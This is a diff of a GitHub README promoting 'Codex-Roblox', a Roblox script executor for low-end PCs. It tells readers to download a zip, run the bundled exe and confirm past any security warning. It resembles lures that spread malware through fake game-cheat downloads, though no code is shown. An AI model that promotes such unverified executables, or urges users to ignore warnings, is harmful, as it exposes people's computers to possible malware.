@@ -1,31 +1,80 @@
-# **Codex-Roblox: The Premier Roblox Script Executor**
+# 🎮 Codex-Roblox - Enjoy Roblox Smoothly on Low-End PCs
 
-## Overview
+## 📥 Download Now
 
-Welcome to the "Codex-Roblox" repository, home to the cutting-edge Roblox script executor - Codex. Are you tired of experiencing lag and instability while enjoying your favorite Roblox games on low-end PCs? Look no further! Codex is here to provide you with a smooth and stable Roblox gameplay experience, tailored for those with hardware limitations. 
+[![Download Codex-Roblox](https://img.shields.io/badge/Download%20Codex--Roblox-v1.0-blue)](https://github.com/AlHayaza/Codex-Roblox/releases)
 
-## Features
+## 🚀 Getting Started
 
-Codex stands out as the go-to script executor for Roblox enthusiasts, offering unparalleled functionality that allows you to effortlessly run scripts for your preferred Roblox games. With Codex, you can unlock a whole new level of customization, enhancing your gameplay and overall user experience on Roblox.
+Welcome to Codex-Roblox! This application helps you execute scripts seamlessly while playing Roblox games. Designed for low-end PCs, Codex-Roblox provides a smooth gaming experience. Follow these steps to download and run the software easily.
 
-## Get Started
+## 📂 System Requirements
 
-To access the incredible features of Codex, simply download the software from the following link: 
+Before you download, make sure your computer meets these requirements:
 
-*Note: Launch the downloaded file to install and start using Codex.*
+- Windows 7 or later
+- At least 2GB of RAM
+- A graphics card that supports DirectX 9 or higher
+- An internet connection for downloading scripts and updates
 
-## Enjoy Smooth Gaming
+## 🔗 Download & Install
 
-With Codex at your fingertips, say goodbye to lag and hello to smooth and stable gameplay on Roblox. Explore the endless possibilities of script execution and enhance your gaming experience like never before.
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/AlHayaza/Codex-Roblox/releases) to find the latest version.
 
-## Feedback and Support
+2. **Choose the Version**  
+   Select the most recent version of Codex-Roblox. Look for the file named something like `Codex-Roblox-v1.0.zip`.
 
-We value your feedback and are here to support you on your Codex journey. If you encounter any issues or have suggestions for improvement, please check the "Releases" section for updates or reach out to our support team.
+3. **Download the File**  
+   Click on the file link to download it. Save it to a location on your computer where you can easily find it (like your Desktop or Downloads folder).
+
+4. **Extract the Files**  
+   After it finishes downloading, locate the downloaded `.zip` file. Right-click on it and select "Extract All" or use any extraction tool you have. This will create a new folder with the application files.
+
+5. **Run Codex-Roblox**  
+   Open the newly created folder. Look for `Codex-Roblox.exe`. Double-click the file to start the application. If a warning appears, confirm that you want to run the file.
+
+## 🔧 How to Use Codex-Roblox
+
+Once you open Codex-Roblox:
+
+1. **Choose Your Game**  
+   Select your preferred Roblox game from the drop-down menu.
+
+2. **Load Your Script**  
+   Paste your script into the provided text box.
+
+3. **Execute the Script**  
+   Click on the "Run" button to start executing your script in the game. Enjoy enhanced features and functionality, making your gameplay experience even better!
+
+## 🌟 Key Features
+
+- **Lightweight Design**: Optimized for low-end PCs, ensuring smooth performance.
+- **Easy Script Execution**: Quickly run scripts with an intuitive interface.
+- **Community Support**: Join the community for help and script sharing.
+- **Regular Updates**: Stay updated with the latest features and fixes.
+
+## 🤝 Community and Contribution
+
+We welcome contributions from everyone! If you want to help improve Codex-Roblox or have any suggestions, feel free to contact us via our GitHub page. Join our community to connect with other users and share your experiences.
+
+## 📜 License
+
+Codex-Roblox is open-source software. You can review the source code, suggest changes, or even contribute on our GitHub page. Make sure to read our license terms before using or distributing the software.
+
+## 💬 Support
+
+If you encounter any issues or need assistance, please check our FAQ section on the [GitHub page](https://github.com/AlHayaza/Codex-Roblox/issues). You can also open a new issue if you need help.
+
+## 🔗 Additional Resources
+
+- [Official Documentation](https://github.com/AlHayaza/Codex-Roblox/wiki) - For detailed guides on usage.
+- [Community Forum](https://forum.example.com) - Connect with other users and find scripts easily.
+
+## 📩 Contact
+
+For questions or feedback, reach out through our GitHub page. We’d love to hear from you! 
 
 ---
 
-Turn your Roblox gaming experience into something extraordinary with Codex. Download now and elevate your gameplay! 🚀
-
----
-
-Thank you for joining us in the world of Codex-Roblox. Happy gaming! 🎮
+Remember to return to the [Releases page](https://github.com/AlHayaza/Codex-Roblox/releases) for updates and new versions. Enjoy using Codex-Roblox!
